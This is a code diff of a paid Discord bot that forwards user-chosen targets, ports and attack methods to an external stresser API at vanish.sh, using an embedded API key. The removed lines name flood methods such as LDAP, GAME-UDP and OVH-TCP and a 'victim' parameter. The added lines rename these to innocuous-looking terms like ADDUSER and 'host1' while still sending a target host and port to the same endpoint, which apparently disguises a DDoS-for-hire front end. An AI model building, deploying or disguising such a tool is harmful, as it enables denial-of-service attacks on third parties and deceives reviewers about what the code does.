@@ -16,16 +16,15 @@ owners  = [0000000, 0000000, 0000000]
 token   = 'bot token here'                 
 bot     = commands.Bot(command_prefix='.')
 # here is where to enter the placeholders that people may enter when using the bot.
-methods = ['LDAP', 'GAME-UDP', 'SOCKET', 'OVH-TCP']            
+methods = ['ADDUSER', 'REMOVEUSER', 'CREATESERVER', 'DELETESERVER']            
 
 api_data = [
     {
         'api_url':'https://vanish.sh/Endpoints/apistart.php?key=', 
         'api_key':'ihsdfih298BGD',              
-        'max_time':'8000'                 
+                      
     }
 ]
-# The max time field can be used for any variable in the api url. 
 
 async def random_color():
     number_lol = random.randint(1, 999999)
@@ -98,7 +97,7 @@ async def del_admin(ctx, admin : int = None):
     
 
 @bot.command()
-async def send(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
+async def send(ctx, method : str = None, host1 : str = None, port : str = None, time : str = None):
     if ctx.author.id not in buyers: # They didn't buy the bot!!
         await ctx.send('Sorry, but you need to buy a spot!')
 
@@ -112,7 +111,7 @@ async def send(ctx, method : str = None, victim : str = None, port : str = None,
          
 
             embed = discord.Embed(title="HELP", description="Help Menu", color=await random_color())
-            embed.add_field(name="Syntax:", value=".send <method> <target> <port> <time>")
+            embed.add_field(name="Syntax:", value=".send <variable> <target> <port> ")
             embed.add_field(name="METHODS:", value=f"{methodstr}")
           
 
@@ -124,19 +123,15 @@ async def send(ctx, method : str = None, victim : str = None, port : str = None,
             
         # The method was invalid!
         elif method.upper() not in methods:
-            await ctx.send(f'Invalid method!!')
+            await ctx.send(f'Invalid Variable!!')
 
-        # There was no victim
-        elif victim is None:
+        # There was no host
+        elif host1 is None:
             await ctx.send('You need a target!')
 
         # There was no port
         elif port is None:
             await ctx.send('You need a port!')
-
-        # There was no time
-        elif time is None:
-            await ctx.send('You need a time!')
 
         # Everything is correct!
         else:
@@ -144,19 +139,14 @@ async def send(ctx, method : str = None, victim : str = None, port : str = None,
                 try:
                     api_url = i["api_url"]
                     api_key = i["api_key"]
-                    max_time = int(i["max_time"])
 
-                    if int(time) > max_time:
-                        time2 = max_time
-
-                    else:
-                        time2 = int(time)
+                   
 
                     async with aiohttp.ClientSession() as session:
                         #You can edit this to whichever format your link is in.
-                        await session.post(f"{api_url}{api_key}&host={victim}&port={port}&time={time2}&method={method}&username=")
+                        await session.get(f"{api_url}{api_key}&host={host1}&port={port}&method={method}&username=")
 
-                        #print(f'{api_url}{api_key}&host={victim}&time={time2}&port={[port]}&method={method.upper()}')
+                        #print(f'{api_url}{api_key}&host={host1}&time={time2}&port={[port]}&method={method.upper()}')
 
                 except Exception as e:
                     #print(e)
@@ -185,7 +175,7 @@ async def send(ctx, method : str = None, victim : str = None, port : str = None,
     else:
         system('clear')
 
-    print(f'{Fore.RED}           Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
+    print(f'{Fore.RED}Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
     
     if str(len(bot.guilds)) == 1:
         await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
